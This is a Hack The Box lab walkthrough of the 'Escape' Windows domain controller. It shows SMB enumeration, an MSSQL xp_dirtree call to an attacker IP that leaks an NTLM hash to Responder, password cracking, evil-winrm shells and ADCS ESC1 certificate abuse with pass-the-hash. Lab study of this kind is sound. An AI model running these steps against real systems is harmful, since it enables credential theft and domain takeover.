---
icon: windows
---

# Escape - Medium

<figure><img src="../../.gitbook/assets/image (907).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/escape"><strong>Escape</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.202 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-02 08:26 EDT
Nmap scan report for sequel.htb (10.10.11.202)
Host is up (0.042s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-02 20:29:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-10-02T20:31:19+00:00; +8h00m05s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-02T20:31:20+00:00; +8h00m05s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-10-02T20:31:19+00:00; +8h00m05s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-01T20:28:24
|_Not valid after:  2055-10-01T20:28:24
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-02T20:31:19+00:00; +8h00m05s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-02T20:31:20+00:00; +8h00m05s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
49749/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-02T20:30:42
|_  start_date: N/A
|_clock-skew: mean: 8h00m04s, deviation: 0s, median: 8h00m04s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   32.55 ms 10.10.16.1
2   73.20 ms sequel.htb (10.10.11.202)
```

Nmap identified the domain names `sequel.htb` and `dc.sequel.htb`. I will add entries for them to `/etc/hosts`

```
10.10.11.202	sequel.htb dc.sequel.htb
```

### <mark style="color:$primary;">SMB Enumeration</mark>

```
netexec smb sequel.htb -u guest -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (911).png" alt=""><figcaption></figcaption></figure>

I am going to take a look at the Public share

<figure><img src="../../.gitbook/assets/image (912).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (913).png" alt=""><figcaption></figcaption></figure>

The Public share contained notes on how to connect to the database and some credentials for a low level user.

### <mark style="color:$primary;">Enumerating MSSQL Database</mark>

<figure><img src="../../.gitbook/assets/image (914).png" alt=""><figcaption></figcaption></figure>

All of these are default databases for MSSQL

<figure><img src="../../.gitbook/assets/image (915).png" alt=""><figcaption></figcaption></figure>

I knew from the start this user did not have permissions, but it was worth a try. The only other thing I can try is to get the SQL server to connect back to my host , authenticate and capture the Hash with responder

Start Responder:

```
sudo responder -I tun0 -v
```

After that in your mssql instance execute the following command. Make sure to replace the ip with your attacking machines ip

```
EXEC xp_dirtree '\\10.10.16.7\share', 1, 1
```

<figure><img src="../../.gitbook/assets/image (916).png" alt=""><figcaption></figcaption></figure>

Now let's crack the hash

### <mark style="color:$primary;">Cracking NTMLv2 hash</mark>

```
john sql_svc.hash -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (917).png" alt=""><figcaption></figcaption></figure>

```
sql_svc:REGGIE1234ronnie
```

<figure><img src="../../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>

sql\_svc can winrm into the machine, let's get a shell!

```
evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
```

<figure><img src="../../.gitbook/assets/image (919).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

sql\_svc does not have any interesting privileges, going to do some manual enumeration and see what I can find on the box.

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (922).png" alt=""><figcaption></figcaption></figure>

Local users with Home Directories on the box gonna keep Ryan.Cooper in mind

<figure><img src="../../.gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>

I found a SQLServer Directory at the root directory. There is a log file inside I am going to take a look at it

```
type ERRORLOG.BAK
```

<figure><img src="../../.gitbook/assets/image (924).png" alt=""><figcaption></figcaption></figure>

It seems like Ryan.Cooper Mistakenly Typed his password in the username field. Let's see if he typed it correctly :smile:

```
netexec winrm sequel.htb -u Ryan.Cooper -p NuclearMosquito3
```

<figure><img src="../../.gitbook/assets/image (925).png" alt=""><figcaption></figcaption></figure>

We can get a shell on the machine as him, let's do that and check his privs

```
evil-winrm -i sequel.htb -u Ryan.Cooper -p NuclearMosquito3
```

<figure><img src="../../.gitbook/assets/image (926).png" alt=""><figcaption></figcaption></figure>

Same privileges as svc\_sql, nothing to work with here.

### <mark style="color:$primary;">ADCS</mark>

```
netexec ldap sequel.htb -u Ryan.Cooper -p NuclearMosquito3 -M adcs
```

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

ADCS is running on this box, now let's check if there are any misconfigured certificates. I am going to use [**Certify**](https://github.com/GhostPack/Certify) and check them on the machine

### <mark style="color:$primary;">Checking for Misconfigured ADCS</mark>

```
certipy-ad find -u Ryan.Cooper -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -vulnerable -stdout
```

<figure><img src="../../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>

From the Certipy output, we can see that the ADCS setup is vulnerable to <mark style="color:red;">**ESC1**</mark>

<mark style="color:yellow;">**Note:**</mark> during BloodHound or Certipy enumeration, if you a user appears in a groups like <mark style="color:$warning;">Enrollment</mark>, **Certificate Requesters**, or has <mark style="color:$warning;">**Enroll/Autoenroll**</mark> rights on a certificate template, investigate it! You might be looking at a path to <mark style="color:$success;">**domain compromise**</mark>**.**

### <mark style="color:$primary;">Abusing ESC1</mark>

<mark style="color:red;">**ESC1**</mark>: A misconfigured certificate template allows low-privileged users to request a certificate for any user, including Domain Admins.

We request a certificate for the `administrator` user. The certificate will be saved as `administrator.pfx`

```
certipy-ad req -username Ryan.Cooper -password 'NuclearMosquito3' -target sequel.htb -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -dc-ip 10.10.11.202
```

<figure><img src="../../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Using the obtained certificate to authenticate as the target</mark> <a href="#using-the-obtained-certificate-to-authenticate-as-the-target" id="using-the-obtained-certificate-to-authenticate-as-the-target"></a>

First I will sync my \[kali]machines clock to the target machines DC. Before authenticating to the target machine with the obtained certificate.&#x20;

```
service virtualbox-guest-utils stop
```

```
sudo ntpdate 10.10.11.202
```

```
certipy-ad auth -pfx administrator.pfx -domain sequel.htb -username administrator -dc-ip 10.10.11.202
```

<figure><img src="../../.gitbook/assets/image (935).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$success;">**certipy-ad**</mark> successfully authenticated as the <mark style="color:$success;">**administrator**</mark> user and retrieved the NT hash

Now with this NT hash we obtained, we can now get a shell on the target machine as the administrator user

```
evil-winrm -i sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```

<figure><img src="../../.gitbook/assets/image (2314).png" alt=""><figcaption></figcaption></figure>
